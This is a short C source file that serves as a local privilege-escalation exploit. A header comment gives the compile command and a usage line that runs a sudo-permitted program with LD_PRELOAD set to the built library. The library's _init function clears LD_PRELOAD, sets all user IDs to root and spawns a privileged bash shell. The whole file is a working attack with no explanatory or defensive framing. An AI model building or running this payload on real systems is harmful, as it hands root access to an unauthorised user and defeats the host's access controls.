#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

/* 
* Compile:gcc -fPIC -shared -nostartfiles preload.c -o /tmp/preload.so 
* sudo LD_PRELOAD=/tmp/preload.so program-name-here
*/

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}